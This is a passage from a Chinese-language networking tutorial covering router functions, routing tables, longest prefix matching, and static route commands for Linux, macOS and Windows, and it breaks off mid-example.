路由度量<br></code></pre></td></tr></table></figure><p><strong>路由器的作用</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs markdown">路由器 = Router<br><br>功能：<br><span class="hljs-bullet">1.</span> 路径选择<br><span class="hljs-bullet">   -</span> 根据路由表选择最佳路径<br><span class="hljs-bullet">   -</span> 转发数据包<br><br><span class="hljs-bullet">2.</span> 连接不同网络<br><span class="hljs-bullet">   -</span> 连接多个子网<br><span class="hljs-bullet">   -</span> 隔离广播域<br><br><span class="hljs-bullet">3.</span> 流量控制<br><span class="hljs-bullet">   -</span> QoS（服务质量）<br><span class="hljs-bullet">   -</span> 流量整形<br><br><span class="hljs-bullet">4.</span> 安全防护<br><span class="hljs-bullet">   -</span> 访问控制列表（ACL）<br><span class="hljs-bullet">   -</span> 防火墙功能<br><br>工作过程：<br>┌──────────────────────────────────────┐<br>│         路由器工作流程               │<br>├──────────────────────────────────────┤<br>│ 1. 接收数据包                        │<br>│ 2. 检查目标IP地址                    │<br>│ 3. 查找路由表                        │<br>│ 4. 确定出口接口和下一跳              │<br>│ 5. 修改以太网头部（源/目标MAC）      │<br>│ 6. TTL减1                            │<br>│ 7. 重新计算校验和                    │<br>│ 8. 转发数据包                        │<br>└──────────────────────────────────────┘<br><br>示例：<br>网络A: 192.168.1.0/24<br>   ↓<br>路由器R1<br>   ↓<br>网络B: 192.168.2.0/24<br><br>主机A (192.168.1.10) → 主机B (192.168.2.20)<br><span class="hljs-bullet">1.</span> A发送数据包，目标IP: 192.168.2.20<br><span class="hljs-bullet">2.</span> A发现目标不在本地网络<br><span class="hljs-bullet">3.</span> A发送给默认网关（路由器R1）<br><span class="hljs-bullet">4.</span> R1接收，查路由表<br><span class="hljs-bullet">5.</span> R1确定从接口2转发<br><span class="hljs-bullet">6.</span> R1修改以太网头部，转发到网络B<br><span class="hljs-bullet">7.</span> 主机B接收<br></code></pre></td></tr></table></figure><h3 id="1-2-路由vs交换"><a href="#1-2-路由vs交换" class="headerlink" title="1.2 路由vs交换"></a>1.2 路由vs交换</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">路由（Routing）vs 交换（Switching）<br><br>┌──────────────┬────────────────┬────────────────┐<br>│    特性      │     交换机     │    路由器      │<br>├──────────────┼────────────────┼────────────────┤<br>│ OSI层        │    第2层       │    第3层       │<br>│ 工作地址     │   MAC地址      │   IP地址       │<br>│ 转发依据     │   MAC地址表    │   路由表       │<br>│ 广播域       │   不隔离       │   隔离         │<br>│ 冲突域       │   隔离         │   隔离         │<br>│ 主要功能     │   局域网连接   │   网络互连     │<br>│ 转发速度     │   快           │   较慢         │<br>│ 智能程度     │   低           │   高           │<br>└──────────────┴────────────────┴────────────────┘<br><br>交换机：<br><span class="hljs-bullet">- </span>在局域网内转发<br><span class="hljs-bullet">- </span>基于MAC地址<br><span class="hljs-bullet">- </span>维护MAC地址表<br><span class="hljs-bullet">- </span>不修改IP包<br><br>路由器：<br><span class="hljs-bullet">- </span>在网络间转发<br><span class="hljs-bullet">- </span>基于IP地址<br><span class="hljs-bullet">- </span>维护路由表<br><span class="hljs-bullet">- </span>修改以太网头部<br><span class="hljs-bullet">- </span>TTL减1<br><br>三层交换机：<br><span class="hljs-bullet">- </span>结合交换和路由功能<br><span class="hljs-bullet">- </span>硬件转发，速度快<br><span class="hljs-bullet">- </span>适合大型局域网<br></code></pre></td></tr></table></figure><h3 id="1-3-直连路由vs间接路由"><a href="#1-3-直连路由vs间接路由" class="headerlink" title="1.3 直连路由vs间接路由"></a>1.3 直连路由vs间接路由</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">直连路由（Direct Routing）：<br>目标网络直接连接在路由器接口上<br><br>示例：<br>路由器R1有两个接口：<br>- eth0: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>/<span class="hljs-number">24</span><br>- eth1: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>/<span class="hljs-number">24</span><br><br>路由表自动包含：<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> dev eth0<br><span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span> dev eth1<br><br>数据流向：<br><span class="hljs-number">192.168.1.10</span> → <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">20</span><br>- 直接在同一网段<br>- 不需要路由器（或路由器直接转发）<br><br>间接路由（Indirect Routing）：<br>目标网络需要通过其他路由器到达<br><br>示例：<br>网络拓扑：<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> ← R1 ← <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">30</span> → R2 → <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><br>R1的路由表：<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> dev eth0 (直连)<br><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">30</span> dev eth1 (直连)<br><span class="hljs-number">192.168.3.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span> (间接，通过R2)<br><br>数据流向：<br><span class="hljs-number">192.168.1.10</span> → <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">20</span><br><span class="hljs-number">1</span>. 发送给R1（默认网关）<br><span class="hljs-number">2</span>. R1查路由表：<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-number">3</span>. R1转发给R2（下一跳）<br><span class="hljs-number">4</span>. R2接收，直连<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">5</span>. R2直接转发到目标主机<br><br>下一跳（Next Hop）：<br>- 到达目标网络的<span class="hljs-string">&quot;下一个&quot;</span>路由器<br>- 必须是直连的（能直接到达）<br></code></pre></td></tr></table></figure><hr><h2 id="2-路由表"><a href="#2-路由表" class="headerlink" title="2. 路由表"></a>2. 路由表</h2><h3 id="2-1-路由表结构"><a href="#2-1-路由表结构" class="headerlink" title="2.1 路由表结构"></a>2.1 路由表结构</h3><p><strong>路由表条目</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs markdown">路由表 = Routing Table<br><br>每个条目包含：<br><br><span class="hljs-bullet">1.</span> 目标网络（Destination）<br><span class="hljs-bullet">   -</span> 目标网络地址<br><span class="hljs-bullet">   -</span> 示例：192.168.1.0/24<br><br><span class="hljs-bullet">2.</span> 子网掩码（Netmask）<br><span class="hljs-bullet">   -</span> 确定网络部分<br><span class="hljs-bullet">   -</span> 示例：255.255.255.0<br><br><span class="hljs-bullet">3.</span> 下一跳/网关（Gateway/Next Hop）<br><span class="hljs-bullet">   -</span> 下一个路由器的IP<br><span class="hljs-bullet">   -</span> 直连则为0.0.0.0或接口<br><span class="hljs-bullet">   -</span> 示例：192.168.2.1<br><br><span class="hljs-bullet">4.</span> 接口（Interface）<br><span class="hljs-bullet">   -</span> 出口网络接口<br><span class="hljs-bullet">   -</span> 示例：eth0, eth1<br><br><span class="hljs-bullet">5.</span> 度量（Metric）<br><span class="hljs-bullet">   -</span> 路径的&quot;代价&quot;<br><span class="hljs-bullet">   -</span> 数值越小越优<br><span class="hljs-bullet">   -</span> 示例：跳数、带宽<br><br><span class="hljs-bullet">6.</span> 标志（Flags）<br><span class="hljs-bullet">   -</span> U: Up，路由有效<br><span class="hljs-bullet">   -</span> G: Gateway，需要网关<br><span class="hljs-bullet">   -</span> H: Host，主机路由<br><span class="hljs-bullet">   -</span> D: Dynamic，动态路由<br><span class="hljs-bullet">   -</span> M: Modified，被修改<br><br>示例路由表：<br><br>Destination     Gateway         Netmask         Flags  Metric  Interface<br>0.0.0.0         192.168.1.1     0.0.0.0         UG     100     eth0<br>192.168.1.0     0.0.0.0         255.255.255.0   U      0       eth0<br>192.168.2.0     192.168.1.254   255.255.255.0   UG     10      eth0<br>10.0.0.0        192.168.1.254   255.0.0.0       UG     20      eth0<br><br>解释：<br>第1行：默认路由（0.0.0.0/0）<br><span class="hljs-bullet">-</span> 所有未匹配的流量走这里<br><span class="hljs-bullet">-</span> 网关：192.168.1.1<br><span class="hljs-bullet">-</span> 接口：eth0<br><br>第2行：直连路由（192.168.1.0/24）<br><span class="hljs-bullet">-</span> 本地网络<br><span class="hljs-bullet">-</span> 无需网关（0.0.0.0）<br><span class="hljs-bullet">-</span> 直接从eth0转发<br><br>第3行：间接路由（192.168.2.0/24）<br><span class="hljs-bullet">-</span> 通过网关192.168.1.254到达<br><span class="hljs-bullet">-</span> 度量：10<br><br>第4行：聚合路由（10.0.0.0/8）<br><span class="hljs-bullet">-</span> 包含所有10.x.x.x网络<br><span class="hljs-bullet">-</span> 度量：20<br></code></pre></td></tr></table></figure><h3 id="2-2-查看路由表"><a href="#2-2-查看路由表" class="headerlink" title="2.2 查看路由表"></a>2.2 查看路由表</h3><p><strong>Linux&#x2F;macOS</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux - 使用ip route</span><br>ip route show<br><br>输出示例：<br>default via 192.168.1.1 dev eth0 proto dhcp metric 100<br>192.168.1.0/24 dev eth0 proto kernel scope <span class="hljs-built_in">link</span> src 192.168.1.10 metric 100<br>192.168.2.0/24 via 192.168.1.254 dev eth0 metric 10<br><br><span class="hljs-comment"># Linux - 使用route（老命令）</span><br>route -n<br><br>输出示例：<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0<br>192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0<br><br><span class="hljs-comment"># macOS - 使用netstat</span><br>netstat -rn<br><br>输出示例：<br>Routing tables<br>Internet:<br>Destination        Gateway            Flags        Netif Expire<br>default            192.168.1.1        UGSc           en0<br>192.168.1.0/24     <span class="hljs-built_in">link</span>#4             UCS            en0<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># 查看路由表<br>route <span class="hljs-built_in">print</span><br><br>输出示例：<br>===========================================================================<br>Interface List<br>  <span class="hljs-number">3</span>...aa-bb-cc-dd-ee-ff ......Ethernet<br>===========================================================================<br><br>IPv4 Route Table<br>===========================================================================<br>Active Routes:<br>Network Destination        Netmask          Gateway       Interface  Metric<br>          <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>          <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>      <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>    <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">10</span>     <span class="hljs-number">25</span><br>        <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>         On-link     <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">10</span>    <span class="hljs-number">281</span><br>===========================================================================<br><br># 添加路由<br>route add <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">254</span><br><br># 删除路由<br>route delete <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><br># 修改路由<br>route change <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">253</span><br></code></pre></td></tr></table></figure><h3 id="2-3-路由查找过程"><a href="#2-3-路由查找过程" class="headerlink" title="2.3 路由查找过程"></a>2.3 路由查找过程</h3><p><strong>最长前缀匹配（Longest Prefix Match）</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">路由查找算法：<br>选择匹配前缀最长的路由<br><br>为什么？<br>更具体的路由优先于一般路由<br><br>示例：<br>路由表：<br><span class="hljs-number">1</span>. <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">0</span>          (默认路由)<br><span class="hljs-number">2</span>. <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">8</span>         (A类网络)<br><span class="hljs-number">3</span>. <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>        (更具体)<br><span class="hljs-number">4</span>. <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>        (最具体)<br><span class="hljs-number">5</span>. <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span>/<span class="hljs-number">32</span>       (主机路由)<br><br>查询：<span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span><br><br>匹配过程：<br><span class="hljs-number">10.1.2.10</span> &amp; <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">0</span>        = <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>      ✅ 匹配（<span class="hljs-number">0</span>位）<br><span class="hljs-number">10.1.2.10</span> &amp; <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">8</span>       = <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     ✅ 匹配（<span class="hljs-number">8</span>位）<br><span class="hljs-number">10.1.2.10</span> &amp; <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>      = <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     ✅ 匹配（<span class="hljs-number">16</span>位）<br><span class="hljs-number">10.1.2.10</span> &amp; <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>      = <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>     ✅ 匹配（<span class="hljs-number">24</span>位）<br><span class="hljs-number">10.1.2.10</span> &amp; <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span>/<span class="hljs-number">32</span>     = <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span>    ✅ 匹配（<span class="hljs-number">32</span>位）<br><br>结果：选择<span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span>/<span class="hljs-number">32</span>（最长前缀）<br><br>优先级：<br>主机路由（/<span class="hljs-number">32</span>）&gt; 子网路由（/<span class="hljs-number">24</span>）&gt; 聚合路由（/<span class="hljs-number">16</span>, /<span class="hljs-number">8</span>）&gt; 默认路由（/<span class="hljs-number">0</span>）<br><br>实际例子：<br><br>路由表：<br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span> via R1<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> via R2<br><br>查询：<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span><br>- 匹配<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>（<span class="hljs-number">16</span>位前缀）<br>- 匹配<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>（<span class="hljs-number">24</span>位前缀）<br>- 选择<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>（更长）→ via R2<br><br>查询：<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">100</span><br>- 匹配<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>（<span class="hljs-number">16</span>位前缀）<br>- 不匹配<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br>- 选择<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span> → via R1<br></code></pre></td></tr></table></figure><p><strong>查找流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs markdown">完整路由查找流程：<br><br><span class="hljs-bullet">1.</span> 接收数据包<br>   ↓<br><span class="hljs-bullet">2.</span> 提取目标IP地址<br>   ↓<br><span class="hljs-bullet">3.</span> 查找路由表<br>   a. 精确匹配（主机路由，/32）<br>   b. 网络匹配（按前缀长度排序）<br>   c. 默认路由（0.0.0.0/0）<br>   ↓<br><span class="hljs-bullet">4.</span> 找到匹配？<br>   是 → 转发到下一跳<br>   否 → 无法路由，丢弃包，发送ICMP目标不可达<br>   ↓<br><span class="hljs-bullet">5.</span> 确定出口接口<br>   ↓<br><span class="hljs-bullet">6.</span> 查ARP表获取下一跳MAC<br>   ↓<br><span class="hljs-bullet">7.</span> 封装以太网帧<br>   ↓<br><span class="hljs-bullet">8.</span> 转发<br><br>多条匹配时：<br><span class="hljs-bullet">1.</span> 最长前缀优先<br><span class="hljs-bullet">2.</span> 前缀长度相同，比较度量（Metric）<br><span class="hljs-bullet">3.</span> 度量相同，负载均衡（ECMP）<br></code></pre></td></tr></table></figure><hr><h2 id="3-静态路由"><a href="#3-静态路由" class="headerlink" title="3. 静态路由"></a>3. 静态路由</h2><h3 id="3-1-静态路由配置"><a href="#3-1-静态路由配置" class="headerlink" title="3.1 静态路由配置"></a>3.1 静态路由配置</h3><p><strong>Linux</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加静态路由</span><br><span class="hljs-comment"># 格式：ip route add &lt;目标网络&gt; via &lt;网关&gt; dev &lt;接口&gt;</span><br><br><span class="hljs-comment"># 添加网络路由</span><br><span class="hljs-built_in">sudo</span> ip route add 192.168.2.0/24 via 192.168.1.254 dev eth0<br><br><span class="hljs-comment"># 添加主机路由</span><br><span class="hljs-built_in">sudo</span> ip route add 10.1.1.100/32 via 192.168.1.254<br><br><span class="hljs-comment"># 添加默认路由</span><br><span class="hljs-built_in">sudo</span> ip route add default via 192.168.1.1<br><br><span class="hljs-comment"># 删除路由</span><br><span class="hljs-built_in">sudo</span> ip route del 192.168.2.0/24<br><br><span class="hljs-comment"># 修改路由</span><br><span class="hljs-built_in">sudo</span> ip route replace 192.168.2.0/24 via 192.168.1.253 dev eth0<br><br><span class="hljs-comment"># 持久化配置（Ubuntu/Debian）</span><br><span class="hljs-comment"># 编辑 /etc/network/interfaces</span><br>auto eth0<br>iface eth0 inet static<br>    address 192.168.1.10<br>    netmask 255.255.255.0<br>    gateway 192.168.1.1<br>    <span class="hljs-comment"># 添加静态路由</span><br>    up ip route add 192.168.2.0/24 via 192.168.1.254 dev eth0<br><br><span class="hljs-comment"># 持久化配置（CentOS/RHEL）</span><br><span class="hljs-comment"># 创建 /etc/sysconfig/network-scripts/route-eth0</span><br>192.168.2.0/24 via 192.168.1.254 dev eth0<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># 添加静态路由<br>route add <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">254</span><br><br># 添加持久路由（-p参数）<br>route add -p <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span 